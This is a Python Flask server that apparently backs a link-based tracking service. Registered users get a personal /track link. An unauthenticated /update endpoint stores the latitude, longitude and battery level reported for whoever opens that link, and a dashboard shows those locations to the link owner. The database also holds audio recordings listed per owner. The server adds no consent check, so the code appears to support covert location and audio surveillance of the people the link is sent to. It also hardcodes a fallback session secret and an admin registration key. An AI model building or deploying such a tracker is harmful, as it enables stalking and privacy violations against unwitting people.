import os
from flask import Flask, render_template, request, redirect, url_for, session, jsonify
from pymongo import MongoClient
from werkzeug.security import generate_password_hash, check_password_hash
from datetime import datetime
import uuid

# 1. Global App Instance
app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "vivan_123")

# --- SECURITY CONFIG ---
# Is key ko aap kabhi bhi badal sakte hain. Naya account banane ke liye ye zaroori hogi.
ADMIN_SECRET_KEY = "VIVAN@2026" 

# 2. Database Connection
MONGO_URI = os.environ.get("MONGO_URI", "your_mongodb_uri_here")
client = MongoClient(MONGO_URI)
db = client['vivan_tracker']
users_col = db['users']
location_col = db['locations']
recording_col = db['recordings']

# Audio Folder logic
AUDIO_FOLDER = 'static/recordings'
if not os.path.exists(AUDIO_FOLDER):
    os.makedirs(AUDIO_FOLDER)

# 3. Health Check Route
@app.route('/health')
def health():
    return "OK", 200

@app.route('/')
def home():
    if 'user_id' in session:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

# --- LOGIN / REGISTER ROUTES ---
@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        # Form se data nikalna
        secret_key_input = request.form.get('secret_key')
        username = request.form.get('username')
        password = request.form.get('password')

        # SECURITY CHECK: Secret key verify karna
        if secret_key_input != ADMIN_SECRET_KEY:
            return "<h1>⚠️ Access Denied!</h1><p>Galat Secret Key dali hai. Aap account nahi bana sakte.</p>", 403

        if users_col.find_one({"username": username}):
            return "User already exists!"
            
        hashed_pw = generate_password_hash(password)
        user_id = str(uuid.uuid4())[:8]
        users_col.insert_one({"user_id": user_id, "username": username, "password": hashed_pw})
        return redirect(url_for('login'))
        
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        user = users_col.find_one({"username": username})
        if user and check_password_hash(user['password'], password):
            session['user_id'] = user['user_id']
            session['username'] = user['username']
            return redirect(url_for('dashboard'))
        return "Invalid credentials!"
    return render_template('login.html')

# --- DASHBOARD & TRACKING ---
@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    base_url = request.url_root.rstrip('/')
    tracking_link = f"{base_url}/track/{session['user_id']}"
    return render_template('dashboard.html', username=session['username'], link=tracking_link)

@app.route('/track/<owner_id>')
def track(owner_id):
    return render_template('index.html', owner_id=owner_id)

@app.route('/update')
def update():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    batt = request.args.get('batt', 'N/A')
    owner_id = request.args.get('owner_id')
    if lat and lon and owner_id:
        location_col.insert_one({
            "owner_id": owner_id,
            "latitude": float(lat),
            "longitude": float(lon),
            "battery": batt,
            "timestamp": datetime.now().strftime("%H:%M:%S")
        })
    return "OK"

@app.route('/get_data')
def get_data():
    if 'user_id' not in session: return jsonify([])
    data = list(location_col.find({"owner_id": session['user_id']}, {'_id': 0}).sort("_id", -1).limit(50))
    return jsonify(data)

@app.route('/get_audios')
def get_audios():
    if 'user_id' not in session: return jsonify([])
    audios = list(recording_col.find({"owner_id": session['user_id']}, {'_id': 0}).sort("_id", -1))
    return jsonify(audios)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

# 4. Port Binding Logic (Render Compatibility)
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
